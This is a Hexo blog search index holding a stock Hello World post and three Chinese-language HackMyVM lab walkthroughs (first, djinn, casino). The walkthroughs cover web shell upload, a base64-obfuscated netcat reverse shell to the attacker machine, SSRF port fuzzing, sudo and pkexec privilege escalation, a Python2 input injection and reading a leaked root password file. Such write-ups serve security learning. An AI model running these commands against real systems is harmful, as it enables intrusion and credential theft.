<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/15/hello-world/</url>
    <content><![CDATA[<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm first 复盘</title>
    <url>/2024/03/15/new/index/</url>
    <content><![CDATA[<h4 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机ip 192.168.64.75</span><br><span class="line">攻击机ip 192.168.64.3</span><br></pre></td></tr></table></figure>

<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫描到3个端口，21端口，22端口和80端口</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:40%;" >

<p>80端口看不到什么内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.09.52.png" ></p>
<p>nmap扫出来ftp端口有几个文件夹，登陆看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.64.75</span><br></pre></td></tr></table></figure>

<p>登陆账号密码都是ftp就行，看来看去只有first文件夹下面有个图片。下载出来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.15.00.png" ></p>
<p>接着就使用<strong>stegseek</strong>工具分析一下，自动分析出一个secret.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ stegseek first.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;firstgurl1&quot;</span><br><span class="line">[i] Original filename: &quot;secret.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;first.jpg.out&quot;.</span><br><span class="line">the file &quot;first.jpg.out&quot; does already exist. overwrite ? (y/n)</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt</span><br><span class="line">SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</span><br></pre></td></tr></table></figure>

<p>secret.txt里面是串base64字符，解密一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt| base64 -d</span><br><span class="line">Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first</span><br></pre></td></tr></table></figure>

<p>注意看中间有一串十六机制数字，再解密一下，得到一个目录，访问一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.23.png" ></p>
<h4 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h4><p>注意到第二点提到有upload.php，扫一下目录试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.57.png" ></p>
<p>扫到一个uploads目录和一个upload.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.21.33.png" ></p>
<p>可以发现文件上传没有任何过滤，那直接上传一个一句话木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.22.48.png" ></p>
<p>蚁剑连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.27.44.png" ></p>
<p>接下来我在目录上传一个后门php，kali开启监听，在蚁剑虚拟终端中用php，即可拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.31.02.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到有neofetch可以利用，<a class="link"   href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F" >https://gtfobins.github.io/在这个网站查询到提权方式<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.39.02.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.38.30.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@first:/tmp$ echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">www-data@first:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">a.sh</span><br><span class="line">www-data@first:/tmp$ sudo -u first neofetch --config a.sh</span><br><span class="line">sudo -u first neofetch --config a.sh</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>

<p>成功拿到first到shell</p>
<p>再次sudo -l，发现有个secret，file查看发现是个二进制文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.43.22.png" ></p>
<p>下载到本地用ida分析一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.45.15.png" ></p>
<p>学习别的wp指导这里有个栈溢出（这块地方有待学习），输入超过10个字符串就会执行我们的command，<strong>思路就是sudo调用，然后给一个&#x2F;bin&#x2F;bash</strong>就拿到root到权限了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.47.23.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>图片隐写分析，提权命令利用，栈溢出的利用。</p>
]]></content>
      <tags>
        <tag>blog</tag>
        <tag>hackmyvm</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm djinn复盘</title>
    <url>/2024/03/18/hackmyvm-djinn%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/?v=djin" >https://hackmyvm.eu/machines/?v=djin<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描，扫到21，1337，7331开放，先用anonymous作为账号密码登陆21号端口，有三个txt文件，下载来看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105541.png" ></p>
<p>game里面说1337端口有个game，nc连接一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105737.png" ></p>
<p>是个计算游戏，需要算对一千次，这种就需要写个脚本解决了（以下脚本是参考wp的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">c = pwn.remote(<span class="string">&#x27;192.168.64.80&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>) <span class="comment"># 建立一个远程联机</span></span><br><span class="line">c.recvuntil(<span class="string">&#x27;gift.\n&#x27;</span>) <span class="comment"># 接收连接中的数据，直到遇到字符串 &#x27;gift.\n&#x27; 为止</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">1001</span>: <span class="comment"># 做1000次循环</span></span><br><span class="line">   count += <span class="number">1</span></span><br><span class="line">   data = c.recvuntil(<span class="string">b&quot;)&quot;</span>).decode()</span><br><span class="line">   c.recv() <span class="comment"># 接收连接中的数据，但不做任何处理，用于清空缓冲区</span></span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   num1, num2, todo = <span class="built_in">int</span>(data[<span class="number">1</span>]), <span class="built_in">int</span>(data[<span class="number">9</span>]), data[<span class="number">5</span>]</span><br><span class="line">   <span class="keyword">if</span> todo == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">      answer= num1 + num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">      answer= num1 - num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">      answer= num1 * num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">      answer= num1 / num2</span><br><span class="line">   c.send((<span class="built_in">str</span>(answer) + <span class="string">&quot;\n\r&quot;</span>).encode())</span><br><span class="line">   <span class="keyword">if</span> count &gt; <span class="number">998</span>: <span class="comment"># 打印最后几次的详细信息</span></span><br><span class="line">        <span class="built_in">print</span>(answer, count)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recv().decode())</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110431.png" ></p>
<p>跑完脚本最后给了三个数字，猜测是敲门，此时22端口是关着的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110523.png" ></p>
<p>按顺序敲门后，22号端口打开了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110607.png" ></p>
<p>接着我想用刚刚拿到的“nitu:81299””nitish81299”尝试登陆ssh，都没有用，这个时候想到之前有个7331端口还没看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.07.20.png" ></p>
<p>先扫目录，用了一个大一点的字典后扫到有&#x2F;wish &#x2F;genie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112555.png" ></p>
<p>访问&#x2F;wish，有个可以execute的，输入id试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111003.png" ></p>
<p>跳转到了genie，注意url有出现www-data，说明是执行成功的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111039.png" ></p>
<p>接下来反弹shell，经过多次尝试，发现可以利用拿到第一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ` <span class="built_in">echo</span> <span class="string">&quot;cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjY0LjMgODg4OCA+L3RtcC9m&quot;</span> | <span class="built_in">base64</span> -d ` | sh -</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span>解码的内容是：<span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.64.3 8888 &gt;/tmp/f</span><br><span class="line">管道 ｜sh - 表示讲解码后的内容交给sh当成脚本执行</span><br></pre></td></tr></table></figure>

<h4 id="提权方式1"><a href="#提权方式1" class="headerlink" title="提权方式1"></a>提权方式1</h4><p>拿到第一个shell后，使用find查看有没有什么可以用（sudo -l找不到什么可以用的）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>看到pkexec可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.18.35.png" ></p>
<p>查找到版本是0.105，上网搜索了一下有没有可以用的脚本，最后找到<a class="link"   href="https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/" >https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/<i class="fas fa-external-link-alt"></i></a> 可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.21.58.png" ></p>
<p>成功提权到root</p>
<h4 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h4><p>切换到home目录下，有nitish和sam两个用户，sam目录进不去，在nitish目录的.dev目录下有个creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112450.png" ></p>
<p>有一个密码，接下来用ssh登陆nitish账户</p>
<p>p4ssw0rdStr3r0n9</p>
<p>sudo -l发现有个genie可以利用，在网上找现成的提权方式失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112652.png" ></p>
<p>-h查看帮助，有一个-e执行cmd，但是还是失败了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112941.png" ></p>
<p>然后用man查看genie，发现有个cmd</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113121.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -cmd 随便写点</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113234.png" ></p>
<p>成功拿到sam的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113352.png" ></p>
<p>sudo -l看到有个lago可以利用，执行看看，测试了一下，有几个选项，其中比较有用的是有个猜数游戏</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113515.png" ></p>
<h5 id="解决思路1（暴力）"><a href="#解决思路1（暴力）" class="headerlink" title="解决思路1（暴力）"></a>解决思路1（暴力）</h5><p>用个一直循环的脚本，一直坚持猜同一个数字，看运气，总有能猜对的时候</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> sudo /root/lago; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113812.png" ></p>
<h5 id="解决思路2"><a href="#解决思路2" class="headerlink" title="解决思路2"></a>解决思路2</h5><p>在&#x2F;home&#x2F;sam的目录下有个.pyc文件，下载下来反编译一下，就能看到lago的源码，注意到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318114957.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.08.59.png" ></p>
<p>选项2那里有个判断，要判断s是否等于num，那直接输入num，input把你传递的num当成了一个变量（注意靶机的pyhton版本是2.x，如果是3以上的版本这个思路不行），num&#x3D;num自然就可以了，神奇。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318115124.png" ></p>
<p>也可以利用input的动态载入，也能拿到root</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>

<p>输入这个python2的input支持动态载入，把这个语句当成表达式执行，如果是pyhton3就只会当成字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113923.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机涉及到的知识点比较多：ftp下载文件，远程计算器脚本的编写，ssh敲门打开端口，反弹shell的绕过方法，pkexec的提权，man查看使用手册（比–help详细），pyc反编译，python2中input的智能转换和动态载入的利用，都很值得学习。</p>
<p>在整个过程中，信息搜集一如既往的重要。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm casino复盘</title>
    <url>/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Casino" >https://hackmyvm.eu/machines/machine.php?vm=Casino<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>靶机ip：192.168.64.82</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描扫到22和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165203.png" ></p>
<p>先到80端口，有个登陆页面，不知道账号密码，先注册一个账号</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165317.png" ></p>
<p>登陆进去后有个三个赌博游戏，起始金额是1000$，经过一番探索结合扫到的目录，我随便在猜点数的游戏把金额全部输光，接着界面就给我跳转到以下这个</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165533.png" ></p>
<p>注意url是”<strong>&#x2F;casino&#x2F;explainmepls.php?learnabout&#x3D;en.wikipedia.org&#x2F;wiki&#x2F;Dice</strong>“，经过测试没办法文件包含查看一下文件，但是?learnabout&#x3D;<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> 会跳转，猜测是存在ssrf漏洞，验证一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165739.png" ></p>
<p>会出现最开始看到的登陆页面，接着就fuzz一下对内有哪些端口开了（记得带上cookie）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i&lt;=<span class="number">65535</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> &gt;&gt; dictionary.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">先生成一个脚本</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w dictionary.txt -u <span class="string">&#x27;http://192.168.64.82/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ&#x27;</span> -fw 284 -b <span class="string">&quot;PHPSPHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318182217.png" ></p>
<p>扫到了6969端口，先访问看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002002.png" ></p>
<p>是有东西的，扫一下目录看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u <span class="string">&quot;http://192.168.64.82/casino/explainmepls.php?learnabout=localhost:6969/FUZZ&quot;</span> -b <span class="string">&quot;PHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span> -fw 284</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004853.png" ></p>
<p>扫到&#x2F;codebreakers，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.23.29.png" ></p>
<p>看到源码有个shimmer_rsa，访问之后意识一个私钥内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002436.png" ></p>
<p>保存之后利用这个文件ssh登陆成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002651.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002957.png" ></p>
<p>可以看到目录下有个pass，是可以执行的，是要猜密码，传到本地用ida分析看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.31.48.png"  alt="main函数"></p>
<p>点击看一下第一个密码的checkpasswd函数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319003547.png" ></p>
<p>有很多个表达式去匹配，我想到用z3去运算出结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建26个变量，每个变量表示字符串中对应位置的字符</span></span><br><span class="line">a = [Int(<span class="string">&#x27;a[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Z3 solver 实例</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加字符串长度等于 26 的约束</span></span><br><span class="line">solver.add(<span class="built_in">len</span>(a) == <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加各种条件约束</span></span><br><span class="line">solver.add(a[<span class="number">0</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">1</span>] + a[<span class="number">6</span>] == <span class="number">208</span>)</span><br><span class="line">solver.add(a[<span class="number">2</span>] - a[<span class="number">4</span>] == <span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">3</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">4</span>] * a[<span class="number">25</span>] == <span class="number">10100</span>)</span><br><span class="line">solver.add(a[<span class="number">5</span>] + a[<span class="number">17</span>] == <span class="number">219</span>)</span><br><span class="line">solver.add(a[<span class="number">6</span>] - a[<span class="number">10</span>] == -<span class="number">11</span>)</span><br><span class="line">solver.add(a[<span class="number">7</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">8</span>] * a[<span class="number">17</span>] == <span class="number">11845</span>)</span><br><span class="line">solver.add(a[<span class="number">9</span>] - a[<span class="number">18</span>] == -<span class="number">7</span>)</span><br><span class="line">solver.add(a[<span class="number">10</span>] - a[<span class="number">24</span>] == <span class="number">1</span>)</span><br><span class="line">solver.add(a[<span class="number">11</span>] * a[<span class="number">4</span>] == <span class="number">9797</span>)</span><br><span class="line">solver.add(a[<span class="number">12</span>] - a[<span class="number">3</span>] == <span class="number">3</span>)</span><br><span class="line">solver.add(a[<span class="number">13</span>] * a[<span class="number">11</span>] == <span class="number">11252</span>)</span><br><span class="line">solver.add(a[<span class="number">14</span>] - a[<span class="number">13</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">15</span>] == a[<span class="number">23</span>])</span><br><span class="line">solver.add(a[<span class="number">16</span>] - a[<span class="number">8</span>] == -<span class="number">5</span>)</span><br><span class="line">solver.add(a[<span class="number">17</span>] * a[<span class="number">7</span>] == <span class="number">10815</span>)</span><br><span class="line">solver.add(a[<span class="number">18</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">19</span>] - a[<span class="number">0</span>] == -<span class="number">8</span>)</span><br><span class="line">solver.add(a[<span class="number">20</span>] - a[<span class="number">23</span>] == <span class="number">4</span>)</span><br><span class="line">solver.add(a[<span class="number">21</span>] + a[<span class="number">7</span>] == <span class="number">220</span>)</span><br><span class="line">solver.add(a[<span class="number">22</span>] - a[<span class="number">1</span>] == <span class="number">15</span>)</span><br><span class="line">solver.add(a[<span class="number">23</span>] == a[<span class="number">15</span>])</span><br><span class="line">solver.add(a[<span class="number">24</span>] * a[<span class="number">2</span>] == <span class="number">12654</span>)</span><br><span class="line">solver.add(a[<span class="number">25</span>] - a[<span class="number">12</span>] == -<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查约束是否满足</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(model[a[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;满足条件的字符串为：&quot;</span>, result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找不到满足条件的字符串&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>跑出来的结果是“满足条件的字符串为： ihopethisisastrongpassword”</p>
<p>这样就拿到第一个密码了，依次输入两个密码拿到一个&#x2F;bin&#x2F;sh，注意这里的点是</p>
<p><strong>程序中open了&#x2F;opt&#x2F;root.pass，但是没有close，可以看一下这个文件相关的进程</strong></p>
<p>“在linux中，每个进程的 <code>/proc/&lt;PID&gt;/fd</code> 目录包含了该进程打开的文件描述符的符号链接。你可以通过查看该目录来了解进程打开的文件描述符的相关信息，可以用<code>ls -l /proc/&lt;PID&gt;/fd</code>查看，而一个进程的PID可以用<code>lsof /path/to/your/file</code>查看”</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsof /opt/root.pass</span><br><span class="line">COMMAND PID    USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">sh      768 shimmer    3r   REG    8,1       15 522246 /opt/root.pass</span><br><span class="line">$ <span class="built_in">ls</span> -l /proc/768/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 1 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 10 -&gt; /dev/tty</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 2 -&gt; /dev/pts/0</span><br><span class="line">lr-x------ 1 shimmer shimmer 64 mar 18 17:43 3 -&gt; /opt/root.pass</span><br><span class="line">$ <span class="built_in">cd</span> /proc/768/fd</span><br><span class="line">$ <span class="built_in">cat</span> &lt;&amp;3</span><br><span class="line">masteradmin420</span><br></pre></td></tr></table></figure>

<p>一顿操作，就拿到了root的密码，su登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004826.png" ></p>
